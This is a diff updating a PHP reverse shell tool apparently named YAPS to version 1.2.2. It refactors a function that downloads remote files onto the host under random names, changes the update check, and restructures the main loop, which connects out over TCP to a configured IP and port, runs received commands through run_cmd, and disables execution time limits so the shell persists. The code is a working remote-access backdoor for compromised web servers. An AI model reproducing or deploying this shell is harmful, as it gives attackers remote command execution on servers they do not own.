@@ -6,7 +6,7 @@
 
 
 //error_reporting(0);
-$version = "1.2.1";
+$version = "1.2.2";
 set_time_limit(0);
 ignore_user_abort(1);
 ini_set('max_execution_time', 0);
@@ -350,25 +350,13 @@ function random_name($name = ""){
 
 function download($url, $saveTo){ //download file from $url to $saveTo
 	$randomName = random_name();
-	if(isAvailable('file_get_contents')){
-		if(isAvailable('file_put_contents')){
-			if(file_put_contents($saveTo."/".$randomName,file_get_contents($url))) return $randomName;
-		}
-		if(isAvailable('fopen') && isAvailable('fwrite') && isAvailable('fclose')){
-			$fp = fopen($saveTo."/".$randomName, "w");
-			if(fwrite($fp, file_get_contents($url))){
-				fclose($fp);
-				return $randomName;
-			}
-		}
-	}
-	if(in_array("curl",get_loaded_extensions()) && isAvailable('fopen') && isAvailable('fwrite') && isAvailable('fclose')){
-		$ch = curl_init();
-		curl_setopt($ch, CURLOPT_URL,$url);
-		$fp = fopen($saveTo.'/'.$randomName, 'w+');
-		curl_setopt($ch, CURLOPT_FILE, $fp);
-		if(curl_exec($ch)){
-			curl_close($ch);
+	$content = get_request($url);
+
+	if(isAvailable('file_put_contents'))
+		if(file_put_contents($saveTo."/".$randomName,$content)) return $randomName;
+	if(isAvailable('fopen') && isAvailable('fwrite') && isAvailable('fclose')){
+		$fp = fopen($saveTo."/".$randomName, "w");
+		if(fwrite($fp, $content)){
 			fclose($fp);
 			return $randomName;
 		}
@@ -639,12 +627,15 @@ function get_request($url){ //todo: change download function
 function verify_update(){
 	global $version, $resources;
 	$newest_version = 0;
-	echo cyan("[i] ")."Checking for updates...\n";
+	echo cyan("[i] ")."Your version: $version. Checking for updates...\n";
 	$request = get_request($resources["verifyUpdateURL"]);
 	if($request) $newest_version = $request;
 
-	if($newest_version !== 0 && (float)$newest_version > (float)$version){
-		echo yellow("[i]")." There is a new version (v".(float)$newest_version.")!\n".green("[DOWNLOAD URL]: ").$resources["updateURL"]."\n";
+	$newest_version_ = str_replace(".","",$newest_version); //get only numbers
+	$version_ = str_replace(".","",$version);
+
+	if($newest_version_ !== 0 && $newest_version_ > $version_){
+		echo red("[i]")." Your version is not up to date.\n".green("[DOWNLOAD v".str_replace("\n","",$newest_version)."]: ").$resources["updateURL"]."\n";
 		return;
 	}
 	echo green("[+] ")."YAPS is already up to date (v$version)!\n";
@@ -711,46 +702,42 @@ function cmd_not_found($cmd){
 
 
 function connect(){
-	global $use_password,$commands,$ps1,$s,$silent,$ip,$port;
+	global $use_password,$commands,$ps1,$s,$silent;
 	refresh_ps1(1);
-	$nofuncs = red('[-] There are no exec functions');
-	if(isAvailable('fsockopen')){
-		if($s){
-			if($use_password)
-				if(!check_password()) die(fwrite($s,red("[-]")." Wrong password.\n")); // guess what
-			if(!isset($_REQUEST['silent']) && !isset($_REQUEST["s"]) && !$silent) //if not in silent mode
-				fwrite($s, banner()."\n"); //send banner through socket
-			refresh_ps1();
-			fwrite($s, "\n".$ps1);
-			while($c = fread($s, 2048)){
-				$out = '';
-				if(substr($c,0,1) == "!"){//if starts with "!"
-					if(in_array(strtolower(substr($c,1,-1)), $commands)) // if the command is valid
-						$out = parse_stdin($c);
-					else
-						cmd_not_found(substr($c,1,-1)); // try to suggest correction
-				}elseif(substr($c, 0, 3) == 'cd '){
-					chdir(substr($c, 3, -1)); // since this isn't interactive, use chdir 
-				}elseif(substr($c,0,-1) == "exit"){
-					fwrite($s, yellow("[i] ")."Closing connection.\n");
-					fclose($s);
-					die();
-				}else{
-					$out = run_cmd(substr($c, 0, -1));
-				}
-				if($out === false){
-					fwrite($s, $nofuncs);
-					break;
-				}
-				refresh_ps1();
-				fwrite($s, $out.$ps1);
-			}
+	if(!isAvailable('fsockopen')) die(red("[-]")." Function 'fsockopen' isn't available.");
+	if($use_password)
+		if(!check_password()) die(fwrite($s,red("[-]")." Wrong password.\n")); // guess what
+	if(!isset($_REQUEST['silent']) && !isset($_REQUEST["s"]) && !$silent) //if not in silent mode
+		fwrite($s, banner()."\n"); //send banner through socket
+	refresh_ps1();
+	fwrite($s, "\n".$ps1);
+	while($c = fread($s, 2048)){
+		$out = '';
+		if(substr($c,0,1) == "!"){//if starts with "!"
+			if(in_array(strtolower(substr($c,1,-1)), $commands)) // if the command is valid
+				$out = parse_stdin($c);
+			else
+				cmd_not_found(substr($c,1,-1)); // try to suggest correction
+		}elseif(substr($c, 0, 3) == 'cd '){
+			chdir(substr($c, 3, -1)); // since this isn't interactive, use chdir 
+		}elseif(substr($c,0,-1) == "exit"){
+			fwrite($s, yellow("[i] ")."Closing connection.\n");
 			fclose($s);
+			die();
 		}else{
-			die(red("[-]")." Couldn't connect to socket $ip:$port.");
+			$out = run_cmd(substr($c, 0, -1));
 		}
+		if($out === false){
+			fwrite($s, red('[-] There are no exec functions'));
+			break;
+		}
+		refresh_ps1();
+		fwrite($s, $out.$ps1);
 	}
+	fclose($s);
 }
+
+########################## END FUNCTION ##########################
 
 if($auto_verify_update) verify_update();
 
@@ -759,5 +746,6 @@ if(isset($_REQUEST['stabilize']) && $_REQUEST['stabilize']){ //stabilized shell 
 	stabilize($x);
 }else{ // use normal (not interactive) connection
 	$s = @fsockopen("tcp://$ip", $port);
+	if(!$s) die(red("[-]")."Couldn't connect to socket $ip:$port.");
 	connect();
 }
